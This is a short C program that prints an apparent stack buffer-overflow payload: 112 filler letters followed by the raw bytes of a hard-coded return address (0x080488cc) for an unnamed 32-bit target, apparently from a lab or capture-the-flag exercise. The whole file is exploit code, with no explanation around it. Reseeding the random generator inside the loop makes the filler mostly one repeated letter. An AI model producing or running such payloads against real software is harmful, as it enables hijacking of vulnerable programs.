#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include<string.h>
int main(int argc,  char* argv[])
{	
	char attack_string[150];
	char string;	
	char r;
	int i;
	for(i=0;i<112;i++)
	{	srand(time(0));
		r = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"[rand() % 26];		
		attack_string[i] = r;
	}	
	attack_string[i] = '\0';
	printf("%s",attack_string);
	printf("\xcc\x88\x04\x08");
	return 0;
}
